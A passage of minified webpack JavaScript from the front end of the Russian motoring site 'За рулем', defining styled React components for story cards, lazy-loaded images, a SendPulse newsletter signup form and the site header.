          })(["display:block;position:absolute;bottom:0;left:0;right:0;padding:0.4375rem 1rem 0.5625rem;background:linear-gradient(180deg,transparent 0,#000 100%);font-size:1.25rem;font-weight:700;line-height:1;color:#fff;@media (max-width:1024px){position:absolute;bottom:16px;left:23px;font-weight:800;font-size:1.3125rem;line-height:1.4375rem;background:none;padding:0 1rem 0 0;}"]),
          s = i(4751),
          M = i(2873);
        function d() {
          var e = (0, s.v9)(M.u5);
          return n.createElement(n.Fragment, null, e.map(function (e) {
            var t = e.name,
              i = e.id,
              r = e.href,
              a = e.picture;
            return n.createElement(n.Fragment, {
              key: i
            }, r && n.createElement(l, {
              href: r
            }, a && n.createElement(o.Ee, {
              picture: a,
              height: 240
            }), n.createElement(c, null, t)));
          }));
        }
      },
      369: (e, t, i) => {
        i.d(t, {
          Z: () => g
        });
        var n = i(7294),
          r = i(9163),
          a = i(7742),
          o = (0, r.ZP)(a.Z).withConfig({
            displayName: "styled__SubscribeBlock",
            componentId: "sc-89hpfq-0"
          })(['margin-bottom:20px;margin-top:2rem;max-width:300px;.sp-form[sp-id="40082"]{padding:0 5px;font-family:PT Sans,Arial,Helvetica,sans-serif;}.sp-form *{width:300px;}.sp-form-outer.sp-force-hide{display:block;}.sp-form button.button{background:0 0;padding:0;border:0;color:#970000 !important;font-weight:700;box-shadow:none;min-width:0;height:auto;line-height:normal;appearance:none;display:inline-block;font-size:1.25rem !important;cursor:pointer;text-decoration:none;text-align:right;outline:0;margin-right:-0.375rem;padding:1px 7px 2px;font-size:20px;}input{background:#ffffff;border-color:#dfdfdf;border-style:solid;border-width:1px;font-size:15px;padding-left:8.75px;padding-right:8.75px;border-radius:4px;height:35px;width:100%;max-width:280px;}form{margin-bottom:0.625rem;}.sp-form[sp-id="40082"] .sp-button-container{text-align:right !important;padding:5px 0 0;}']),
          l = r.ZP.div.withConfig({
            displayName: "styled__SubscribeTitle",
            componentId: "sc-89hpfq-1"
          })(["font-size:19px;color:#970000;line-height:22px;margin-bottom:0.5rem;"]),
          c = r.ZP.div.withConfig({
            displayName: "styled__SubscribeSocial",
            componentId: "sc-89hpfq-2"
          })(["display:flex;flex-flow:row wrap;align-items:center;p{font-size:19px;line-height:22px;color:#970000;margin-right:8px;}"]),
          s = i(405),
          M = i(8526),
          d = i(9115);
        function g() {
          return n.createElement(d.Uo, {
            placeholderHeight: [150],
            offset: 300
          }, n.createElement(o, {
            isSticky: !0,
            isPlain: !0
          }, n.createElement(s.q, null, n.createElement("script", {
            type: "text/javascript",
            async: !0,
            src: "//web.webformscr.com/apps/fc3/build/default-handler.js?1591191285660"
          }), n.createElement("script", {
            async: !0,
            src: "//web.webformscr.com/apps/fc3/build/loader.js",
            "sp-form-id": "ed77df782f9aae5614e0d32bb0f39f3244e76021d3816751238b339a501fd297"
          })), n.createElement("div", {
            className: "sp-form-outer sp-force-hide"
          }, n.createElement("div", {
            id: "sp-form-40082",
            "sp-id": "40082",
            "sp-hash": "ed77df782f9aae5614e0d32bb0f39f3244e76021d3816751238b339a501fd297",
            "sp-lang": "ru",
            className: "sp-form sp-form-regular sp-form-embed",
            "sp-show-options": "%7B%22condition%22%3A%22onEnter%22%2C%22delay%22%3A10%2C%22repeat%22%3A3%2C%22background%22%3A%22rgba(0%2C%200%2C%200%2C%200.5)%22%2C%22position%22%3A%22bottom-right%22%2C%22satellite%22%3Afalse%2C%22maDomain%22%3A%22login.sendpulse.com%22%2C%22formsDomain%22%3A%22forms.sendpulse.com%22%2C%22urlFilter%22%3Afalse%2C%22urlFilterConditions%22%3A%5B%7B%22force%22%3A%22hide%22%2C%22clause%22%3A%22contains%22%2C%22token%22%3A%22%22%7D%5D%7D"
          }, n.createElement("div", {
            className: "sp-form-fields-wrapper"
          }, n.createElement("div", {
            className: "sp-message"
          }, n.createElement("div", null)), n.createElement(l, null, "РАССЫЛКИ «ЗА РУЛЕМ» (ЛУЧШЕЕ):"), n.createElement("form", {
            className: "form sp-element-container ui-sortable ui-droppable sp-field-nolabel"
          }, n.createElement("div", {
            className: "sp-field subscribe-form-field",
            "sp-id": "sp-667d98ce-c1e3-4fda-9bbc-2d36905166fd"
          }, n.createElement("input", {
            type: "email",
            "sp-type": "email",
            name: "sform[email]",
            className: "field form_field sp-form-control",
            placeholder: "Ваша почта",
            "sp-tips": "%7B%22required%22%3A%22%D0%9E%D0%B1%D1%8F%D0%B7%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%D0%BD%D0%BE%D0%B5%20%D0%BF%D0%BE%D0%BB%D0%B5%22%2C%22wrong%22%3A%22%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9%20email-%D0%B0%D0%B4%D1%80%D0%B5%D1%81%22%7D",
            required: !0
          })), n.createElement("div", {
            className: "sp-field sp-button-container subscribe-form-field",
            "sp-id": "sp-1bcd88ff-17b4-46db-b352-806a75f06229"
          }, n.createElement("button", {
            id: "sp-1bcd88ff-17b4-46db-b352-806a75f06229",
            className: "button"
          }, " ", "›  Подписаться"))), n.createElement("div", {
            className: "sp-link-wrapper sp-brandname__left"
          })))), n.createElement(c, null, n.createElement("p", null, "А еще"), n.createElement(M.WG, {
            network: ["zen", "vk", "youtube", "tg", "viber"],
            width: 42,
            height: 42
          }))));
        }
      },
      8865: (e, t, i) => {
        i.d(t, {
          Z: () => u
        });
        var n = i(3038),
          r = i.n(n),
          a = i(7294),
          o = i(131),
          l = i(8107),
          c = i.n(l),
          s = i(9163),
          M = i(8655),
          d = s.ZP.div.withConfig({
            displayName: "styled__SuspendableElement",
            componentId: "sc-1itt1z4-0"
          })(["z-index:", ";", " ", " &[* > div:empty]{min-height:unset;}"], function (e) {
            return e.$zIndex ? e.$zIndex : "unset";
          }, function (e) {
            var t = e.$mobileHeight,
              i = e.$desktopHeight,
              n = e.$contentVisibility;
            return (0, M.fq)("$contentVisibilityOn", (0, s.iv)(["content-visibility:", ";min-height:", "px;contain-intrinsic-size:100% ", "px;@media (max-width:768px){min-height:", ";contain-intrinsic-size:100% ", "px;}"], n, i, i, t ? "".concat(t, "px") : "unset", t));
          }, ((0, M.fq)("$zIndex"), (0, s.iv)(["position:relative;"]))),
          g = function (e) {
            return e;
          };
        function u(e) {
          var t = e.children,
            i = e.offset,
            n = void 0 === i ? 300 : i,
            l = e.mobileOffset,
            s = e.placeholderHeight,
            M = void 0 === s ? [250] : s,
            u = e.preventUnload,
            m = void 0 !== u && u,
            p = e.forceInitialRender,
            y = e.withMinHeight,
            I = void 0 === y || y,
            N = e.contentVisibilityOn,
            j = void 0 === N || N,
            h = e.hasInnerResize,
            x = void 0 !== h && h,
            D = e.className,
            f = e.zIndex,
            w = (0, a.useRef)(null),
            z = (0, a.useRef)(null),
            T = (0, a.useState)(!1),
            L = r()(T, 2),
            E = L[0],
            A = L[1],
            b = (0, a.useState)(Boolean(p)),
            v = r()(b, 2),
            O = v[0],
            k = v[1],
            C = (0, a.useState)(void 0),
            S = r()(C, 2),
            Z = S[0],
            Q = S[1],
            P = Array.isArray(M) ? M : [M, M],
            U = r()(P, 2),
            Y = U[0],
            _ = U[1],
            W = l || n,
            G = (0, o.YD)({
              threshold: 0,
              rootMargin: "".concat(W, "px 0px ").concat(W, "px 0px"),
              skip: m && O
            }),
            R = G.ref,
            H = G.inView;
          c()({
            ref: w,
            onResize: function (e) {
              var t = e.height;
              O && Q(void 0 !== t ? t : void 0);
            },
            round: g
          });
          var B = (0, a.useCallback)(function (e) {
            w.current = e, R(e);
          }, [R]);
          (0, a.useEffect)(function () {
            H && !E && A(!0);
          }, [H, E]), (0, a.useEffect)(function () {
            k(H || E && Boolean(m));
          }, [H, E, m]), (0, a.useEffect)(function () {
            if (w.current) {
              var e = w.current;
              if (e) {
                var t = z.current;
                Q(t ? t.clientHeight : e.clientHeight);
              }
            }
          }, [O]);
          var F = "function" == typeof t ? t : function () {
            return t;
          };
          return a.createElement(d, {
            className: D,
            ref: B,
            $contentVisibility: O ? "unset" : "hidden",
            $contentVisibilityOn: j,
            $mobileHeight: I ? Z || _ : void 0,
            $desktopHeight: I ? Z || Y : void 0,
            $zIndex: f
          }, x ? a.createElement("div", {
            ref: z
          }, O && F()) : a.createElement(a.Fragment, null, O && F()));
        }
      },
      2700: (e, t, i) => {
        i.d(t, {
          Z: () => f
        });
        var n = i(7154),
          r = i.n(n),
          a = i(3038),
          o = i.n(a),
          l = i(6479),
          c = i.n(l),
          s = i(7294),
          M = i(131),
          d = i(4343),
          g = i(8526),
          u = ["image", "children", "sizes", "maxSize", "isWebp", "noFormatUrl", "small"],
          m = [420, 767, 1024, 1024],
          p = [240, 240, 400, 600],
          y = [200, 200, 240, 240];
        function I(e) {
          var t = e.image,
            i = e.children,
            n = (e.sizes, e.maxSize, e.isWebp, e.noFormatUrl),
            r = e.small,
            a = c()(e, u);
          return n ? s.createElement(s.Fragment, null, i) : s.createElement("picture", a, m.map(function (e, i) {
            return m.length - 1 === i ? s.createElement("source", {
              srcSet: r ? "".concat(t, "=h").concat(y[i]) : "".concat(t, "=h").concat(p[i]),
              media: "(min-width: ".concat(e, "px)"),
              key: e
            }) : s.createElement("source", {
              srcSet: r ? "".concat(t, "=h").concat(y[i]) : "".concat(t, "=h").concat(p[i]),
              media: "(max-width: ".concat(e, "px)"),
              key: e
            });
          }), i);
        }
        var N = i(9163),
          j = i(8655),
          h = N.ZP.div.withConfig({
            displayName: "styled__Wrapper",
            componentId: "sc-gjhksx-0"
          })(["height:0;padding-bottom:", "%;overflow:hidden;", " ", " position:relative;z-index:10;display:block;& > picture > div{width:100%;height:100%;position:absolute;}", ""], function (e) {
            return e.$ratio ? 100 / e.$ratio : 56.25;
          }, (0, j.Zn)("$ratio", (0, N.iv)(["height:auto;padding-bottom:unset;"])), (0, j.fq)("$gallery", (0, N.iv)(["margin:auto;"])), (0, j.fq)("$withoutWrap", (0, N.iv)(["height:auto;padding-bottom:unset;overflow:unset;z-index:unset;& > picture > div{height:auto;position:relative;}"]))),
          x = N.ZP.img.withConfig({
            displayName: "styled__Image",
            componentId: "sc-gjhksx-1"
          })(["position:", ";width:100%;height:", ";left:0;top:0;display:block;", " @media (max-width:768px){height:", ";}"], (0, j.fq)("$isStaticPosition", "static", "absolute"), function (e) {
            return e.$deskPlaceholderHeight ? "".concat(e.$deskPlaceholderHeight, "px") : "auto";
          }, (0, j.fq)("$withoutWrap", (0, N.iv)(["position:static;"])), function (e) {
            return e.$mobPlaceholderHeight ? "".concat(e.$mobPlaceholderHeight, "px") : "auto";
          }),
          D = ["picture", "url", "alt", "maxSize", "sizes", "forceInitialRender", "withPreload", "className", "noFormatUrl", "withoutWrap", "placeholderHeight", "gallery", "small"];
        function f(e) {
          var t = e.picture,
            i = e.url,
            n = e.alt,
            a = void 0 === n ? "" : n,
            l = e.maxSize,
            u = void 0 === l ? 1280 : l,
            m = e.sizes,
            p = e.forceInitialRender,
            y = void 0 !== p && p,
            N = e.withPreload,
            j = void 0 !== N && N,
            f = e.className,
            w = e.noFormatUrl,
            z = void 0 !== w && w,
            T = e.withoutWrap,
            L = void 0 !== T && T,
            E = e.placeholderHeight,
            A = e.gallery,
            b = e.small,
            v = c()(e, D),
            O = (0, s.useState)(!1),
            k = o()(O, 2),
            C = k[0],
            S = k[1],
            Z = (0, M.YD)({
              threshold: 0,
              rootMargin: "-30% 0px -30% 0px"
            }),
            Q = Z.ref,
            P = Z.inView || C || y;
          P && !C && S(!0);
          var U = t.servingUrl,
            Y = t.href,
            _ = function (e) {
              return (e.width || 640) / (e.height || 400);
            }(t),
            W = U || Y,
            G = z ? W : "".concat(d.G3).concat(W) || i || "",
            R = E || [],
            H = o()(R, 2),
            B = H[0],
            F = H[1];
          return s.createElement(h, {
            $ratio: _,
            $withoutWrap: L,
            ref: Q,
            $gallery: A
          }, j && s.createElement(g.LU, {
            src: G || ""
          }), P ? s.createElement(I, {
            image: G || "",
            sizes: m,
            maxSize: u,
            noFormatUrl: z,
            small: b
          }, s.createElement(x, r()({
            width: "100%",
            height: "auto",
            $isStaticPosition: !_,
            alt: a,
            src: G,
            className: f,
            $withoutWrap: L
          }, v))) : s.createElement("picture", null, s.createElement(x, {
            width: "100%",
            $withoutWrap: L,
            height: _ ? "100%" : "auto",
            $isStaticPosition: !_,
            $deskPlaceholderHeight: B,
            $mobPlaceholderHeight: F,
            alt: a,
            src: "https://www.zr.ru/f/media/1x1.gif?123"
          })));
        }
      },
      5368: (e, t, i) => {
        i.d(t, {
          Z: () => g
        });
        var n = i(7294),
          r = i(9163),
          a = i(257),
          o = i(2718),
          l = r.ZP.div.withConfig({
            displayName: "styled__TopMobileContainer",
            componentId: "sc-1kt9ysx-0"
          })(["display:block;margin:0 -12px;"]),
          c = r.ZP.div.withConfig({
            displayName: "styled__TopStories",
            componentId: "sc-1kt9ysx-1"
          })(["display:flex;flex-flow:row wrap;align-items:flex-start;background:#eee;justify-content:space-between;"]),
          s = (0, r.ZP)(a.Z).withConfig({
            displayName: "styled__MobileStory",
            componentId: "sc-1kt9ysx-2"
          })(["margin-top:1px;background-color:#000000;&:last-child{display:block;padding:0;}&:first-child{padding:0;}"]),
          M = (0, r.ZP)(o.Z).withConfig({
            displayName: "styled__TopMobileAnnouncement",
            componentId: "sc-1kt9ysx-3"
          })(["border-bottom:1px solid #b9b9b9;padding:8px 12px;"]),
          d = i(6804);
        function g(e) {
          var t = e.stories,
            i = t[0],
            r = t.slice(1, 5),
            o = t.slice(5, 10);
          return n.createElement(l, null, i && n.createElement(a.Z, {
            story: i,
            kingSize: !0,
            hideCounters: !0
          }), n.createElement(c, null, r.map(function (e, t) {
            return n.createElement(s, {
              story: e,
              key: t,
              hideCounters: !0
            });
          })), n.createElement(d.Wr, {
            slot: "36",
            isVisible: [!1, !0],
            withoutSticky: !0
          }), o.map(function (e, t) {
            return n.createElement(M, {
              story: e,
              isShort: !0,
              isInline: !0,
              key: t,
              hideCounters: !0,
              small: !0
            });
          }));
        }
      },
      9115: (e, t, i) => {
        i.d(t, {
          Or: () => we,
          tn: () => rn,
          wS: () => Fi.Z,
          jP: () => Li,
          Ie: () => Wi,
          Tj: () => Qi,
          Dv: () => it.Z,
          xv: () => Bi.Z,
          Ar: () => tt,
          RI: () => We.Z,
          Fg: () => Gi.Z,
          Y3: () => Re.Z,
          h_: () => et,
          e4: () => Ge.Z,
          sY: () => nt.Z,
          D5: () => hi,
          f1: () => He.Z,
          Uo: () => ot.Z,
          to: () => Hi,
          gC: () => at
        });
        var n = i(9713),
          r = i.n(n),
          a = i(3038),
          o = i.n(a),
          l = i(7294),
          c = i(4751),
          s = i(9163),
          M = i(8655),
          d = i(8526),
          g = i(4343),
          u = s.ZP.header.withConfig({
            displayName: "styled__Header",
            componentId: "sc-1w3elxd-0"
          })(["position:sticky;top:0;left:0;right:0;height:", "px;justify-content:space-between;align-items:center;box-sizing:border-box;z-index:100;background-color:#fff;width:1100px;@media (min-width:1700px){width:1100px;margin:0 auto;}@media (min-width:1366px){width:1100px;}@media (max-width:1365px){width:1030px;}@media (max-width:1024px){width:100%;height:", "px;}@media (max-width:768px){width:100%;overflow:visible;height:", "px;}", ""], g.Pu, g.Xt, g.SI, (0, M.fq)("$hideOnGal", (0, s.iv)(["position:static;"]))),
          m = s.ZP.div.withConfig({
            displayName: "styled__HeaderContent",
            componentId: "sc-1w3elxd-1"
          })(['padding:8px 10px 8px 20px;position:relative;z-index:15;display:flex;align-items:center;background:"#fff";@media (max-width:1024px){padding:4px 12px 4px 12px;height:40px;justify-content:space-between;}']),
          p = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__LogoLink",
            componentId: "sc-1w3elxd-2"
          })(["display:inline-block;height:41px;width:194px;z-index:3;background:url(", ") no-repeat 0 0;background-size:contain;&:hover{border-color:transparent;}@media (max-width:1024px){height:32px;width:152px;background-size:cover;}@media (max-width:768px){height:2rem;width:152px;margin:0;}"], "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTk0IiBoZWlnaHQ9IjQxIiB2aWV3Qm94PSIwIDAgMTk0IDQxIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTQuNzg1OCAyLjE0MjgxQzguNjY2MTggMC40NDc3NTIgMTIuMzUyNSAwIDE2LjM5NDYgMEMyMS40MzkxIDAgMjcuNjQ3NyAyLjMwMjcyIDI3Ljc0NDcgOC43OTUxM0MyNy44MDk0IDEyLjQ0MTEgMjYuMjg5NiAxNS4yODc2IDIyLjI0NzUgMTYuODU0N0MyNS40MTY1IDE3Ljk0MjEgMjYuODA2OSAyMC45MTY0IDI2LjgwNjkgMjMuOTIyOEMyNi44MDY5IDMyLjA3ODIgMTkuMTQzMiAzNS4zNzIzIDEyLjEyNjIgMzUuMzcyM0M4LjMxMDQ5IDM1LjM3MjMgMy4zOTUzMyAzNC41MDg5IDAgMzIuNTlMMS4yOTM0NiAyNS4xN0M0LjQ2MjQ0IDI2Ljk2MSA3Ljc5MzA5IDI4LjAxNjUgMTEuNjQxMSAyOC4wMTY1QzE0LjUxOTEgMjguMDE2NSAxNy40OTQgMjcuMjE3IDE3LjQ5NCAyNC4wMTg2QzE3LjQ5NCAyMS4xNzIzIDE1LjAzNjUgMjAuNzg4NSAxMi40NDk2IDIwLjc4ODVINy4wMTcwMUw4LjAxOTQ2IDEzLjcyMDRIMTIuOTM0NkMxNS44NDQ5IDEzLjcyMDQgMTguOTE2OSAxMy4yNzI3IDE4Ljg1MjIgOS45NDY0OUMxOC43MjI4IDcuMjkxOTYgMTUuMzI3NSA3LjA2ODEgMTMuNzEwNiA3LjA2ODFDOS44OTQ5OCA3LjEzMjA2IDcuMDgxNyA3LjkzMTYyIDMuNTI0NjggMTAuMDEwNUw0Ljc4NTggMi4xNDI4MVpNNzIuMjY1NCA2Ljg3NTNMNzEuNzQ4IDEwLjEwNTVDNzMuMzk3MSA5LjUyOTgzIDc0LjE0MDkgOS40NjU4NyA3Ni4yMTA0IDkuNDY1ODdDODIuNTE2IDkuNDY1ODcgODUuOTExNCAxMy42MjM2IDg1LjkxMTQgMTkuODkyMkM4NS45MTE0IDMwLjMxODMgNzkuMTIwNyAzNS4xMTU3IDcxLjIzMDUgMzUuMTE1N0M2OS44NzI0IDM1LjExNTcgNjguNDgyIDM0Ljk4NzcgNjcuOTY0NiAzNC44Mjc4TDY2Ljk2MjEgNDAuOTY4NEg1OC42NTE3TDYyLjExMTcgMTkuMzgwNEg2MS45NUM2MC42NTY1IDIwLjMwNzkgNTguNzE2MyAyMi44NjY0IDU3Ljc0NjIgMjQuMzY5NkM1Ny4zOTA2IDI0Ljg4MTMgNTcuMDM0OSAyNS4xMzcyIDU2LjY0NjggMjQuOTQ1M0w1Ni41MTc1IDI0Ljg4MTNDNTYuMDk3IDI0LjY1NzUgNTYgMjQuMTc3NyA1Ni4yOTExIDIzLjQ0MjFDNTcuNTE5OSAyMC40OTk4IDU5LjU1NzEgMTYuNTY2IDYyLjg1NTQgMTQuMDA3NEw2NC4wMTk1IDYuODc1M0g3Mi4yNjU0Wk0xNjAuMjQ0IDI0LjI0MTRIMTQ0Ljg1MUMxNDQuNzIyIDI4LjgxNDkgMTQ4LjExOCAyOS4zMjY1IDE0OS45OTMgMjkuMzI2NUMxNTMuMjU5IDI5LjMyNjUgMTU2LjIwMSAyOC42MjMgMTU5LjA4IDI3LjA1NTlMMTU4LjA3OCAzMy40ODQzQzE1NC45MDggMzUuMDUxNCAxNTEuNzA3IDM1LjQ5OTEgMTQ4LjI0NyAzNS40OTkxQzEzNy42MDkgMzUuNDk5MSAxMzYuMzc5IDI3Ljk4MzMgMTM2LjM3OSAyNC4xNDU1QzEzNi40NDQgMTUuOTg5OSAxNDEuMTMzIDkuMzM3NjYgMTUwLjA5IDkuMzM3NjZDMTU5LjM3MSA5LjM2OTY0IDE2MS4zNDMgMTcuMTQxMyAxNjAuMjQ0IDI0LjI0MTRaTTU0LjYxMyAxMC4yMDExTDUwLjc5NzQgMzQuNzMxNUg0Mi45MDcyTDQzLjMyNzYgMzIuMDEzMUg0My4xNjU5QzQwLjg2OTkgMzQuOTIzNCAzOC4yNTA3IDM1LjQzNTEgMzYuMzEwNSAzNS40MzUxQzMxLjIzMzcgMzUuNDM1MSAyOC4zNTU3IDMyLjMwMDkgMjguMzU1NyAyNi4wMDAzQzI4LjM1NTcgMTUuMjIyMyAzNS44OTAyIDkuNDk3NSA0NS42MjM0IDkuNDk3NUM0OS4yMTI4IDkuNDk3NSA1Mi4xNTU1IDkuODQ5MzIgNTQuNjEzIDEwLjIwMTFaTTEyNC4wMDMgMzQuNjk5NEwxMjYuODc2IDE2LjI3NzdIMTIyLjI1MkMxMjAuODkzIDIxLjg0MjYgMTIwLjc5NyAyMi40ODIyIDEyMC42MDIgMjMuMTIxOUMxMTkuMzA5IDI4Ljc1MDggMTE3LjQ5OCAzNC41NzE1IDEwNy44OTQgMzUuNDAzTDEwNi42OTggMjguODc4N0MxMDkuMzgyIDI4LjMwMjkgMTEwLjYxIDI3LjcyNzMgMTExLjc0MiAyNS45Njg0QzExMi40MjEgMjQuODE3IDExMy4xNjUgMjIuOTMgMTE0Ljg3OSAxNS42N0wxMTYuMTcyIDEwLjE2OTFIMTM2LjAyN0wxMzIuMjExIDM0LjY5OTRIMTI0LjAwM1pNMTEyLjc4IDEwLjIwMTFMOTYuOTY3MSA0MUg4Ny44NDgyTDkyLjQ3MjMgMzIuMzY0OEw4NS41NTIyIDEwLjIwMTFIOTQuMjE4M0w5OC4wNjY1IDIzLjUwNThMMTAzLjg1NSAxMC4yMDExSDExMi43OFpNMTYwLjQ2NyAzNC43MzE0TDE2Ni40ODEgMTAuMjAxMUgxNzUuMzc0TDE3OC45OTUgMjEuOTA2NkwxODUuNDk1IDEwLjIwMTFIMTk0VjM0LjczMTRIMTg1Ljk4TDE4Ni4xMSAyMS44MTA3TDE3OC44NjYgMzQuNzMxNEgxNzUuMThMMTcxLjA3NCAyMS44NzQ3TDE2OC4xOTUgMzQuNzMxNEgxNjAuNDY3Wk0xNDkuNTA2IDE0Ljc3NEMxNDYuMjczIDE0Ljc3NCAxNDUuNCAxNy40OTI0IDE0NS4wMTIgMjAuMTQ3SDE1Mi40NUMxNTIuNzQxIDE3Ljk0MDMgMTUyLjc0MSAxNC43NzQgMTQ5LjUwNiAxNC43NzRaTTcwLjgwODkgMTYuMjc3TDY4LjgwNCAyOC41NTgzQzY5LjQ1MDcgMjguNzE4MSA3MC4xOTQ1IDI4LjcxODEgNzAuNDg1NSAyOC43MTgxQzc0Ljk4MDIgMjguNzE4MSA3Ny4yNzYxIDI0LjY1NjUgNzcuMjExNSAyMC40MzQ3Qzc3LjE0NjcgMTcuNzE2MiA3NS44MjEgMTUuNzMzMyA3My4xMDQ4IDE1LjczMzNDNzEuOTczIDE1LjczMzMgNzEuMjkzOSAxNS45ODkxIDcwLjgwODkgMTYuMjc3Wk00NS41OTAxIDE1LjkyNTJDNDUuMjM0MyAxNS43OTczIDQ0LjcxNyAxNS43NjUzIDQ0LjI5NjcgMTUuNzY1M0MzOS41MTA4IDE1Ljc2NTMgMzYuNjk3NCAyMC4yMTA4IDM2LjY5NzQgMjQuOTc2M0MzNi42MzI5IDI3LjQ3MDcgMzcuNzY0NiAyOS4wMzc5IDM5LjYwNzggMjkuMDM3OUM0MC45NjU5IDI5LjAzNzkgNDIuMjI3MSAyOC44MTQxIDQzLjY0OTkgMjcuMjQ3TDQ1LjU5MDEgMTUuOTI1MloiIGZpbGw9IiNDRTAwMDAiLz4KPC9zdmc+Cg=="),
          y = s.ZP.div.withConfig({
            displayName: "styled__HeaderNavContainerDesktop",
            componentId: "sc-1w3elxd-3"
          })(["flex:1;z-index:2;@media (max-width:768px){display:none;}"]),
          I = s.ZP.nav.withConfig({
            displayName: "styled__HeaderNav",
            componentId: "sc-1w3elxd-4"
          })(["text-transform:uppercase;font-weight:700;font-size:22px;color:#fff;display:flex;justify-content:space-around;align-items:center;padding-top:0.35rem;@media (max-width:1024px){padding-top:3px;margin-right:0;}@media (max-width:786px){padding-top:0.3125rem;}"]),
          N = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__HeaderNavLink",
            componentId: "sc-1w3elxd-5"
          })(["font-size:22px;flex-shrink:0;@media (max-width:1024px){font-size:18px;}"]),
          j = s.ZP.div.withConfig({
            displayName: "styled__HeaderActions",
            componentId: "sc-1w3elxd-6"
          })(["margin-left:20px;padding-top:0.35rem;display:flex;align-items:center;width:79px;@media (max-width:1024px){padding-top:3px;}@media (max-width:768px){padding-top:0;margin-left:0;width:auto;}"]),
          h = s.ZP.span.withConfig({
            displayName: "styled__SitemapButton",
            componentId: "sc-1w3elxd-7"
          })(["cursor:pointer;transition:0.3s;display:block;width:1.75rem;height:1.1875rem;background:url(", ") no-repeat center center;"], "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjciIGhlaWdodD0iMTkiIHZpZXdCb3g9IjAgMCAyNyAxOSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgMS41ODc5MUgyNyIgc3Ryb2tlPSIjM0Q0ODRBIiBzdHJva2Utd2lkdGg9IjMiLz4KPHBhdGggZD0iTTAgOS41SDI3IiBzdHJva2U9IiMzRDQ4NEEiIHN0cm9rZS13aWR0aD0iMyIvPgo8cGF0aCBkPSJNMCAxNy40MTIxSDI3IiBzdHJva2U9IiMzRDQ4NEEiIHN0cm9rZS13aWR0aD0iMyIvPgo8L3N2Zz4K"),
          x = s.ZP.div.withConfig({
            displayName: "styled__HeaderTags",
            componentId: "sc-1w3elxd-8"
          })(["background:#e0e0e0;font-size:1.25rem;padding:0.1rem 0.75rem 0.25rem;display:flex;position:relative;z-index:10;align-items:center;box-sizing:border-box;height:32px;@media (max-width:1024px){height:28px;}"]),
          D = s.ZP.div.withConfig({
            displayName: "styled__TagsLinks",
            componentId: "sc-1w3elxd-9"
          })(["display:flex;align-items:center;overflow-x:scroll;scroll-behavior:smooth;-ms-overflow-style:none;scrollbar-width:none;&::-webkit-scrollbar{display:none;}", ""], (0, M.fq)("$spaceBetween", (0, s.iv)(["justify-content:space-between;"]))),
          f = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__TagsLink",
            componentId: "sc-1w3elxd-10"
          })(["flex-shrink:0;font-size:18px;&:not(:last-child){margin-right:1.25rem;}"]),
          w = s.ZP.div.withConfig({
            displayName: "styled__TagsWrap",
            componentId: "sc-1w3elxd-11"
          })(["overflow:hidden;margin:0 0.6875rem;width:100%;"]),
          z = "\n  flex-shrink: 0;\n  color: #3D484A;\n  cursor: pointer;\n",
          T = s.ZP.div.withConfig({
            displayName: "styled__PrevControl",
            componentId: "sc-1w3elxd-12"
          })(["", " ", ""], z, (0, M.fq)("$isPrevDisabled", (0, s.iv)(["pointer-events:none;"]))),
          L = s.ZP.div.withConfig({
            displayName: "styled__NextControl",
            componentId: "sc-1w3elxd-13"
          })(["", " ", ""], z, (0, M.fq)("$isNextDisabled", (0, s.iv)(["pointer-events:none;"]))),
          E = s.ZP.div.withConfig({
            displayName: "styled__SitemapPanel",
            componentId: "sc-1w3elxd-14"
          })(["display:flex;flex-flow:row;align-items:flex-start;justify-content:space-between;font-weight:400;vertical-align:top;text-align:left;@media (max-width:768px){flex-flow:column;overflow:hidden;}"]),
          A = s.ZP.div.withConfig({
            displayName: "styled__SitemapList",
            componentId: "sc-1w3elxd-15"
          })(["width:271px;background:#f2f2f2;min-width:222px;"]),
          b = s.ZP.div.withConfig({
            displayName: "styled__SitemapAnnouns",
            componentId: "sc-1w3elxd-16"
          })(["padding:10px 0 10px 20px;display:flex;flex-flow:column;align-items:flex-end;"]),
          v = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__SitemapLink",
            componentId: "sc-1w3elxd-17"
          })(["display:block;padding:10px 0 10px 20px;border-bottom:1px solid #3d3b3c;cursor:pointer;", " ", " span{color:#3d484a;font-size:", "px;font-weight:700;}&:last-child{border-bottom:none;padding:15px 0 15px 20px;span{font-size:16px;}}&:hover{background-color:#ce0000;span{color:#fff;}}"], (0, M.fq)("$isUpperCase", (0, s.iv)(["text-transform:uppercase;"])), (0, M.fq)("$allLine", (0, s.iv)(["grid-column-start:1;grid-column-end:3;width:100%;text-align:center;padding-left:0;"])), function (e) {
            return e.$fontSize ? e.$fontSize : 17;
          }),
          O = s.ZP.div.withConfig({
            displayName: "styled__SitemapStories",
            componentId: "sc-1w3elxd-18"
          })(["margin:0 0 12px;display:flex;justify-content:space-between;"]),
          k = s.ZP.div.withConfig({
            displayName: "styled__SitemapStory",
            componentId: "sc-1w3elxd-19"
          })(["padding:0 22px 18px;border-right:1px solid rgba(127,127,127,0.98);cursor:pointer;width:33%;max-height:300px;overflow:hidden;&:first-child{padding-left:0;}&:last-child{border-right:none;padding-right:0;}"]),
          C = (0, s.ZP)(d.Mj).withConfig({
            displayName: "styled__StoryDate",
            componentId: "sc-1w3elxd-20"
          })(["font-weight:400;font-size:14px;line-height:18px;text-transform:lowercase;color:#4c6871;padding:6px 0 0 0;letter-spacing:0;"]),
          S = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__StoryLink",
            componentId: "sc-1w3elxd-21"
          })(["display:block;font-size:20px;line-height:22px;font-weight:700;padding-top:6px;&:hover{border-color:transparent;}"]),
          Z = s.ZP.div.withConfig({
            displayName: "styled__StoryDescription",
            componentId: "sc-1w3elxd-22"
